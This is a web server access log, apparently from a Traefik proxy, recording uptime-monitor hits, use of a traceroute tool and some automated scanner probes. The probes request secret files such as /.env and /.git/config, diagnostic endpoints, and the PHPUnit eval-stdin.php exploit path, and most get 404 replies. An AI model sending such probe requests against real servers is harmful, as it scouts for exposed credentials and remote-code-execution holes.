172.105.128.11 - - [18/Dec/2023:21:16:40 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6589 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6590 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6591 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6592 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6593 "www@docker" "http://172.18.0.9:80" 0ms
198.74.56.46 - - [18/Dec/2023:21:19:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6594 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6595 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6596 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6597 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6598 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:21:21:17 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6599 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6600 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6601 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6602 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6603 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6604 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6605 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6606 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6607 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6608 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6609 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6610 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6611 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6612 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6613 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6614 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6615 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6616 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6617 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6618 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6619 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6620 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6621 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6622 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6623 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6624 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6625 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6626 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [18/Dec/2023:21:34:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6627 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:21:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6628 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6629 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6630 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6631 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6632 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6633 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6634 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6635 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:21:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6636 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6637 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6638 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6639 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6640 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6641 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6642 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6643 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6644 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6645 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6646 "www@docker" "http://172.18.0.9:80" 0ms
185.236.231.100 - - [18/Dec/2023:21:43:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6647 "web-to-websecure@internal" "-" 0ms
185.236.231.100 - - [18/Dec/2023:21:43:48 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6648 "web-to-websecure@internal" "-" 0ms
185.236.231.100 - - [18/Dec/2023:21:43:49 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 6649 "-" "-" 0ms
185.236.231.100 - - [18/Dec/2023:21:43:49 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 6650 "-" "-" 0ms
83.97.73.87 - - [18/Dec/2023:21:43:50 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 6651 "-" "-" 0ms
185.236.231.100 - - [18/Dec/2023:21:43:52 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 17 "-" "-" 6652 "web-to-websecure@internal" "-" 0ms
185.236.231.100 - - [18/Dec/2023:21:43:53 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 19 "-" "-" 6653 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6654 "www@docker" "http://172.18.0.9:80" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6655 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6656 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:32 +0000] "GET /.git/config HTTP/1.1" 404 19 "-" "-" 6657 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:33 +0000] "GET /server-status HTTP/1.1" 404 19 "-" "-" 6658 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:34 +0000] "GET /config.json HTTP/1.1" 404 19 "-" "-" 6659 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:34 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 6660 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:35 +0000] "GET /telescope/requests HTTP/1.1" 404 19 "-" "-" 6661 "-" "-" 0ms
35.216.190.15 - - [18/Dec/2023:21:44:36 +0000] "GET /info.php HTTP/1.1" 404 19 "-" "-" 6662 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:21:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6663 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6664 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6665 "www@docker" "http://172.18.0.9:80" 0ms
5.196.102.79 - - [18/Dec/2023:21:45:47 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 6666 "web-to-websecure@internal" "-" 0ms
80.13.0.216 - - [18/Dec/2023:21:45:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6667 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [18/Dec/2023:21:46:07 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6668 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [18/Dec/2023:21:46:08 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 6669 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [18/Dec/2023:21:46:08 +0000] "GET /sitemap.xml HTTP/1.1" 301 17 "-" "-" 6670 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [18/Dec/2023:21:46:08 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 17 "-" "-" 6671 "web-to-websecure@internal" "-" 0ms
94.102.49.190 - - [18/Dec/2023:21:46:09 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 6672 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6673 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6674 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6675 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6676 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6677 "www@docker" "http://172.18.0.9:80" 0ms
192.155.88.231 - - [18/Dec/2023:21:48:26 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6678 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:21:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6679 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6680 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6681 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.104 - - [18/Dec/2023:21:50:07 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6682 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6683 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6684 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6685 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6686 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6687 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6688 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6689 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6690 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6691 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6692 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6693 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.106 - - [18/Dec/2023:21:55:27 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 6694 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:21:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6695 "www@docker" "http://172.18.0.9:80" 0ms
90.151.171.106 - - [18/Dec/2023:21:55:37 +0000] "GET /ip.php?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 6696 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6697 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6698 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:21:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6699 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6700 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:21:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6701 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6702 "www@docker" "http://172.18.0.9:80" 0ms
205.210.31.206 - - [18/Dec/2023:21:58:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6703 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:21:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6704 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:21:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6705 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6706 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6707 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:05 +0000] "GET /trace HTTP/2.0" 404 548 "-" "-" 6708 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:06 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 6709 "www@docker" "http://172.18.0.9:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:09 +0000] "GET /trace/ HTTP/2.0" 200 6062 "-" "-" 6710 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [18/Dec/2023:22:01:10 +0000] "GET /trace/styles.css?version=11 HTTP/2.0" 200 1367 "-" "-" 6711 "livetrace@docker" "http://172.18.0.3:80" 0ms
173.48.140.140 - - [18/Dec/2023:22:01:15 +0000] "GET /trace/startping.php?id=bsgmywf0m HTTP/2.0" 200 105 "-" "-" 6712 "livetrace@docker" "http://172.18.0.3:80" 6ms
173.48.140.140 - - [18/Dec/2023:22:01:15 +0000] "GET /trace/starttrace.php?id=w9w8sgxor HTTP/2.0" 200 106 "-" "-" 6713 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [18/Dec/2023:22:01:16 +0000] "GET /trace/polltrace.php?id=w9w8sgxor HTTP/2.0" 200 372 "-" "-" 6715 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:16 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 32 "-" "-" 6714 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:01:17 +0000] "GET /trace/polltrace.php?id=w9w8sgxor HTTP/2.0" 200 372 "-" "-" 6717 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:17 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 59 "-" "-" 6716 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:01:18 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 85 "-" "-" 6718 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:22:01:18 +0000] "GET /trace/polltrace.php?id=w9w8sgxor HTTP/2.0" 200 372 "-" "-" 6719 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:01:19 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 112 "-" "-" 6720 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:01:19 +0000] "GET /trace/polltrace.php?id=w9w8sgxor HTTP/2.0" 200 621 "-" "-" 6721 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:19 +0000] "GET /trace/cleantrace.php?id=w9w8sgxor HTTP/2.0" 200 72 "-" "-" 6722 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:22:01:20 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 137 "-" "-" 6723 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:01:21 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 158 "-" "-" 6724 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [18/Dec/2023:22:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6725 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:22:01:22 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 186 "-" "-" 6726 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:01:23 +0000] "GET /trace/pollping.php?id=bsgmywf0m HTTP/2.0" 200 216 "-" "-" 6727 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:01:23 +0000] "GET /trace/cleanping.php?id=bsgmywf0m HTTP/2.0" 200 71 "-" "-" 6728 "livetrace@docker" "http://172.18.0.3:80" 3ms
69.164.217.245 - - [18/Dec/2023:22:01:34 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6729 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:22:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6730 "www@docker" "http://172.18.0.9:80" 0ms
192.155.90.118 - - [18/Dec/2023:22:02:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6731 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6732 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6733 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6734 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6735 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6736 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:22:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6737 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:22:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6738 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6739 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6740 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6741 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [18/Dec/2023:22:07:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6742 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:22:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6743 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:22:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6744 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:22:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6745 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [18/Dec/2023:22:08:27 +0000] "GET /trace/starttrace.php?id=u4q6cbic5 HTTP/2.0" 200 106 "-" "-" 6747 "livetrace@docker" "http://172.18.0.3:80" 3ms
173.48.140.140 - - [18/Dec/2023:22:08:27 +0000] "GET /trace/startping.php?id=wm97b1d2g HTTP/2.0" 200 105 "-" "-" 6746 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [18/Dec/2023:22:08:28 +0000] "GET /trace/polltrace.php?id=u4q6cbic5 HTTP/2.0" 200 408 "-" "-" 6748 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:28 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 34 "-" "-" 6749 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:29 +0000] "GET /trace/polltrace.php?id=u4q6cbic5 HTTP/2.0" 200 408 "-" "-" 6750 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:29 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 59 "-" "-" 6751 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:30 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 85 "-" "-" 6753 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:30 +0000] "GET /trace/polltrace.php?id=u4q6cbic5 HTTP/2.0" 200 408 "-" "-" 6752 "livetrace@docker" "http://172.18.0.3:80" 2ms
198.235.24.53 - - [18/Dec/2023:22:08:31 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6754 "-" "-" 0ms
173.48.140.140 - - [18/Dec/2023:22:08:31 +0000] "GET /trace/polltrace.php?id=u4q6cbic5 HTTP/2.0" 200 657 "-" "-" 6755 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:31 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 111 "-" "-" 6757 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:08:31 +0000] "GET /trace/cleantrace.php?id=u4q6cbic5 HTTP/2.0" 200 72 "-" "-" 6756 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [18/Dec/2023:22:08:32 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 130 "-" "-" 6758 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:08:33 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 163 "-" "-" 6759 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:34 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 190 "-" "-" 6760 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [18/Dec/2023:22:08:35 +0000] "GET /trace/pollping.php?id=wm97b1d2g HTTP/2.0" 200 211 "-" "-" 6761 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [18/Dec/2023:22:08:35 +0000] "GET /trace/cleanping.php?id=wm97b1d2g HTTP/2.0" 200 71 "-" "-" 6762 "livetrace@docker" "http://172.18.0.3:80" 2ms
167.71.120.76 - - [18/Dec/2023:22:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6763 "www@docker" "http://172.18.0.9:80" 0ms
